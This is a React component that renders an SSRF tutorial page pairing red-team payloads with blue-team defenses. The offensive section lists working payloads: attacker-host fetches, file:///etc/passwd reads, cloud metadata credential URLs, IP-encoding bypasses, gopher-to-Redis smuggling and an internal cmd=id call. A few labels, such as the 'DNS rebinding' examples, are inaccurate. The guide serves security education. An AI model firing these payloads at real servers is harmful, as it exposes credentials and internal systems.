export default function SSRFPage() {
  return (
    <main className="p-8 max-w-4xl mx-auto font-sans text-white">
      <h1 className="text-4xl font-extrabold mb-8 text-purple-600">Server-Side Request Forgery (SSRF) Comprehensive Guide</h1>

      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-3">What is SSRF?</h2>
        <p className="leading-relaxed">
          Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to make the server perform unauthorized requests on behalf of the attacker. 
          This can be used to access internal systems, read sensitive metadata, or even pivot into private networks.
        </p>
        <div className="mt-4 p-4 bg-gray-800 rounded-lg">
          <h3 className="text-lg font-semibold mb-2 text-orange-300">SSRF Impact Severity:</h3>
          <ul className="list-disc list-inside space-y-1">
            <li>Access to internal services (databases, admin panels)</li>
            <li>Cloud metadata exposure (AWS IAM keys, Azure tokens)</li>
            <li>Port scanning of internal networks</li>
            <li>Remote code execution via internal services</li>
            <li>Bypass of firewall restrictions</li>
          </ul>
        </div>
      </section>

      <section className="mb-10">
        <h2 className="text-3xl font-semibold mb-4 text-red-600">Red Team Techniques (Offensive)</h2>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">1. Basic SSRF Attacks</h3>
          
          <h4 className="font-medium mb-1 mt-3">URL Fetching</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://vulnerable.com/api/fetch?url=http://attacker.com`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">File Protocol</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://vulnerable.com/export?template=file:///etc/passwd`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">2. Cloud Metadata Exploitation</h3>
          
          <h4 className="font-medium mb-1 mt-3">AWS IMDSv1</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Azure Metadata</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://169.254.169.254/metadata/instance?api-version=2021-02-01`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">3. Advanced Bypass Techniques</h3>
          
          <h4 className="font-medium mb-1 mt-3">DNS Rebinding</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://7f000001.0x7f.1 (127.0.0.1)
http://localtest.me (resolves to 127.0.0.1)`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">URL Obfuscation</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://127.0.0.1:80@evil.com
http://0177.0.0.1 (Octal encoding)
http://0x7f.0x0.0x0.0x1 (Hex encoding)
http://①②⑦.⓪.⓪.① (Unicode)`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">4. Protocol Smuggling</h3>
          
          <h4 className="font-medium mb-1 mt-3">Gopher Protocol</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0aPING%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0akey%0d%0a$5%0d%0avalue%0d%0a`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">SSRF to RCE</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://internal-admin-panel.local/run?cmd=id
http://127.0.0.1:8080/actuator/gateway/routes/new`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">5. Tools & Payloads</h3>
          
          <h4 className="font-medium mb-1 mt-3">Detection Tools</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Burp Collaborator</li>
            <li>Interactsh</li>
            <li>SSRF Sheriff</li>
            <li>OOB Testing Tools</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Exploitation Tools</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>SSRFmap</li>
            <li>Gopherus</li>
            <li>CloudScraper</li>
            <li>Metabadger (AWS protection bypass)</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Payload Lists</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Cloud metadata endpoints</li>
            <li>Internal service URLs</li>
            <li>DNS rebinding domains</li>
            <li>Alternative IP encodings</li>
          </ul>
        </article>
      </section>

      <section className="mb-10">
        <h2 className="text-3xl font-semibold mb-4 text-blue-600">Blue Team Defenses (Defensive)</h2>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">1. Input Validation</h3>
          
          <h4 className="font-medium mb-1 mt-3">Strict Allowlisting</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`// Only allow specific domains
const ALLOWED_DOMAINS = ['api.trusted.com', 'cdn.safe.org'];

if (!ALLOWED_DOMAINS.includes(new URL(input).hostname)) {
  throw new Error('Domain not allowed');
}`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Block Reserved Ranges</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`// Reject private, localhost, and cloud IPs
function isForbiddenIP(ip) {
  return ip.match(/^127\.|^10\.|^192\.168\.|^172\.(1[6-9]|2[0-9]|3[0-1])\.|^169\.254\./);
}`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">2. Network Controls</h3>
          
          <h4 className="font-medium mb-1 mt-3">Egress Filtering</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Restrict outbound connections</li>
            <li>Block internal IP ranges</li>
            <li>Implement proxy whitelisting</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Cloud Protections</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>AWS IMDSv2 (required)</li>
            <li>GCP metadata restrictions</li>
            <li>Azure metadata firewall rules</li>
          </ul>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">3. Secure Coding Practices</h3>
          
          <h4 className="font-medium mb-1 mt-3">Safe Libraries</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Use <code>requests</code> with <code>allow_redirects=False</code></li>
            <li>Avoid <code>file://</code>, <code>gopher://</code>, <code>dict://</code></li>
            <li>Disable following redirects</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Framework Protections</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`# Django SSRF Protection
from django_ssrf.protection import SSRFProtect

@SSRFProtect
def fetch_url(request):
    # Your view code`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">4. Monitoring & Detection</h3>
          
          <h4 className="font-medium mb-1 mt-3">Log Analysis</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Monitor for internal IP requests</li>
            <li>Alert on metadata endpoint access</li>
            <li>Track abnormal outbound traffic</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">WAF Rules</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Block known SSRF patterns</li>
            <li>Detect encoded IP addresses</li>
            <li>Flag DNS rebinding attempts</li>
          </ul>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">5. Cloud-Specific Protections</h3>
          
          <h4 className="font-medium mb-1 mt-3">AWS</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Enforce IMDSv2</li>
            <li>Use instance metadata firewall</li>
            <li>Restrict IAM roles</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Azure</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Disable metadata service where unused</li>
            <li>Use managed identities</li>
            <li>Implement network security groups</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">GCP</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Disable legacy metadata endpoints</li>
            <li>Use workload identity</li>
            <li>Restrict metadata access</li>
          </ul>
        </article>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-semibold mb-4">Additional Resources & References</h2>
        <div className="space-y-6">
          <div className="bg-gray-800 p-4 rounded-lg">
            <h3 className="text-xl font-semibold mb-3 text-yellow-400">Learning Resources</h3>
            <ul className="space-y-3">
              <li>
                <a href="https://portswigger.net/web-security/ssrf" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  PortSwigger SSRF Academy — Interactive labs
                </a>
              </li>
              <li>
                <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  OWASP SSRF — Comprehensive documentation
                </a>
              </li>
              <li>
                <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  PayloadsAllTheThings SSRF — Cheat sheet
                </a>
              </li>
            </ul>
          </div>
          <div className="bg-gray-800 p-4 rounded-lg">
            <h3 className="text-xl font-semibold mb-3 text-yellow-400">Security Tools</h3>
            <ul className="space-y-3">
              <li>
                <a href="https://github.com/swisskyrepo/SSRFmap" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  SSRFmap — Automated exploitation tool
                </a>
              </li>
              <li>
                <a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  Gopherus — Generate Gopher payloads
                </a>
              </li>
              <li>
                <a href="https://github.com/projectdiscovery/interactsh" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  Interactsh — OOB interaction server
                </a>
              </li>
            </ul>
          </div>
        </div>
      </section>

      <div className="p-4 bg-gray-800 rounded-lg border-l-4 border-yellow-500">
        <h3 className="text-lg font-semibold mb-2 text-yellow-400">SSRF Mitigation Checklist</h3>
        <ul className="list-disc list-inside ml-4 space-y-1">
          <li>Implement strict URL allowlisting</li>
          <li>Validate and sanitize all user-supplied URLs</li>
          <li>Block access to internal IP ranges and metadata services</li>
          <li>Use network segmentation for sensitive backends</li>
          <li>Enable cloud provider metadata protections (IMDSv2)</li>
          <li>Monitor for suspicious outbound requests</li>
          <li>Regularly test SSRF protections</li>
        </ul>
      </div>
    </main>
  );
}